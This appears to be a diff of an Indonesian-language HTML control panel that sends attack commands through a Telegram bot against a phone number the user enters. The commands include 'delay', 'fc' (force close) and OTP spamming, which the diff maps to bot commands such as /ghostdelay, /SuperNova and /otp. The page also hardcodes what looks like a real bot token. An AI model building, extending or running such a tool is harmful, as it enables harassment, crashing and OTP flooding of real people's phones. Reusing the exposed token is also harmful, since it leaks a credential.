@@ -1,4 +1,4 @@
-l<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
@@ -10,14 +10,15 @@ l<!DOCTYPE html>
   <div class="login-container">
     <h2 id="welcome">Selamat Datang!</h2>
     <input type="text" id="target" placeholder="Masukkan target (cth: 628xxxx)">
-    <button onclick="sendCommand('delay')">delay</button>
-    <button onclick="sendCommand('fc')">fc</button>
+    <button onclick="sendCommand('delay')">Delay</button>
+    <button onclick="sendCommand('fc')">FC</button>
     <button onclick="sendCommand('spam otp')">Spam OTP</button>
     <button onclick="logout()" style="background:#ff4d4d;color:white">Logout</button>
   </div>
+
   <script>
-    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI";
-    const chatId = "-1002745890175"; // Ganti dengan chat_id grup / akun kamu
+    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI"; // Ganti dengan token bot kamu
+    const chatId = "YOUR_TELEGRAM_ID"; // Ganti dengan ID Telegram kamu (user ID / group ID)
 
     function logout() {
       localStorage.removeItem("sentra_user");
@@ -33,7 +34,14 @@ l<!DOCTYPE html>
         return;
       }
 
-      const message = `👤 Menu: ${cmd.toUpperCase()}\n📱 Target: ${target}\n👤 User: ${user}`;
+      let commandText = "";
+
+      if (cmd === "delay") commandText = `/ghostdelay ${target}`;
+      else if (cmd === "fc") commandText = `/SuperNova ${target}`;
+      else if (cmd === "spam otp") commandText = `/otp ${target}`;
+
+      const message = `👤 Menu: ${cmd.toUpperCase()}\n📱 Target: ${target}\n👤 User: ${user}\n\n${commandText}`;
+
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
